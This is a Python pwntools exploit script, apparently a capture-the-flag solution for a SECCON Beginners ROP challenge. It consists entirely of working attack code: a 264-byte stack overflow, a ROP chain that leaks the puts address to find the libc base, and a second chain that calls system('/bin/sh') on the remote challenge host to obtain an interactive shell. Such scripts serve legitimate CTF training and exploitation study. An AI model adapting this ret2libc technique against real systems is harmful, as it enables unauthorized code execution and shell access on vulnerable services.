from pwn import *

elf = ELF("./chall")
context.binary = elf
libc = ELF('./libc-2.27.so')

#s = process('./chall', env={'LD_PRELOAD' : './libc-2.27.so'})
s = remote('beginners-rop.quals.beginners.seccon.jp', 4102)

pop_rdi = 0x00401283
puts_plt = 0x401070
puts_got = 0x404018
main = 0x401196
ret = 0x40101a

offset = 264
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

s.sendline(payload)
s.recvline()
libc_addr = u64((s.recvline()[:-1]).ljust(8, b'\00')) - libc.symbols.puts
print(hex(libc_addr))
libc.address = libc_addr

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(ret)
payload += p64(libc.symbols['system'])
s.sendline(payload)

s.interactive()
